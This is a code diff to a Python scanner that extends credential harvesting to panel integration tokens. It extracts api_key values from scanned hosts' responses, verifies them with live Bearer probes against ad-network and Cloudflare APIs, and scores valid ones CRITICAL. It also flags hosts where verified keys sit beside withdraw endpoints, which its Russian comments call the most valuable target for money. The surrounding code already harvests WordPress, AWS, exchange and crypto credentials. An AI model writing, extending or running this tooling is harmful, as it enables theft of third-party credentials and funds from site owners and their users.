@@ -25,11 +25,13 @@ from .ai_verify import (
     extract_twitter_bearers,
     extract_twitter_sessions,
     extract_wp_creds,
+    extract_integrations,
     probe_wp_sites,
     verify_ai_key,
     verify_aws_keypair,
     verify_cryptopay_key,
     verify_exchange_keypair,
+    verify_integration,
     verify_secret,
     verify_telegram_bot,
     verify_twilio_pair,
@@ -575,6 +577,7 @@ SEVERITY_MAP = {
     "wp_salt": "HIGH",
     "wp_password": "CRITICAL",
     "wp_creds_valid": "CRITICAL",
+    "integration_valid": "CRITICAL",
     "db_password": "CRITICAL",
     # Адрес кошелька сам по себе денег не даёт (нужен ключ) - понижаем
     "wallet_address": "MEDIUM",
@@ -771,6 +774,9 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
             cryptopay_keys_seen: set[tuple] = set()
             wp_pairs_found: list[dict[str, str]] = []
             wp_panel_seen: bool = False
+            integrations_found: list[dict[str, str]] = []
+            integration_entries_seen: set[str] = set()
+            integration_panel_seen: bool = False
             # id-fuzz: id'шники из тел + GET-шаблоны с {param} для фазы 2
             fuzz_buckets: dict[str, set[str]] = {}
             param_templates_seen: set[str] = set()
@@ -892,6 +898,14 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                                     )
                                 if cfg.secret_checks:
                                     secrets_found.update(extract_secrets(body[:100_000]))
+                                if cfg.integration_checks:
+                                    # интеграционные токены панелей (service_type+api_key)
+                                    if '"api_key"' in body:
+                                        integration_panel_seen = True
+                                    for entry in extract_integrations(body[:100_000]):
+                                        if entry["api_key"] not in integration_entries_seen:
+                                            integration_entries_seen.add(entry["api_key"])
+                                            integrations_found.append(entry)
                                 if cfg.wp_checks:
                                     # маркер + извлечение пар (url можно взять из entry)
                                     if '"wp_user"' in body or '"wp_password"' in body:
@@ -1299,6 +1313,31 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                         if len(wp_checks) >= cfg.wp_verify_max:
                             break
 
+            # Интеграции панелей (service_type+api_key): Bearer-проба known-
+            # сервисов (clickadu balance, clickadilla profile, cloudflare).
+            integration_checks: list[dict[str, Any]] = []
+            if cfg.integration_checks and integrations_found:
+                integration_seen: set[str] = set()
+                for entry in integrations_found:
+                    stype = entry.get("service_type", "")
+                    key = entry.get("api_key", "")
+                    sig = (stype, key)
+                    if sig in integration_seen or not key:
+                        continue
+                    integration_seen.add(sig)
+                    chk = await verify_integration(
+                        session, stype, key, name=entry.get("name", ""),
+                        endpoint=entry.get("endpoint", ""),
+                        proxy=proxy, timeout_s=max(cfg.check_timeout, 8),
+                    )
+                    integration_checks.append(chk)
+                    if chk["status"] == "valid":
+                        all_patterns.append("integration_valid")
+                        if severity_order.get(max_severity, 0) < 3:
+                            max_severity = "CRITICAL"
+                    if len(integration_checks) >= cfg.integration_verify_max:
+                        break
+
             # Money-корреляция: withdraw-эндпоинты + проверенные денежные
             # ключи на одном хосте = самая ценная цель (деньги и вход в одном месте)
             money_verified = (
@@ -1309,6 +1348,7 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                 or any(c.get("status") == "valid" and c.get("kind") == "stripe" for c in secret_checks)
                 or any(c.get("status") == "auth_ok" for c in dsn_checks)
                 or any(c.get("status") == "valid" for c in wp_checks)
+                or any(c.get("status") == "valid" for c in integration_checks)
             )
             if money_verified and any(
                 "withdraw_endpoint" in (ep.get("patterns") or [])
@@ -1362,6 +1402,7 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                 "exchange_checks": exchange_checks,
                 "cryptopay_checks": cryptopay_checks,
                 "wp_checks": wp_checks,
+                "integration_checks": integration_checks,
             }
 
     except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
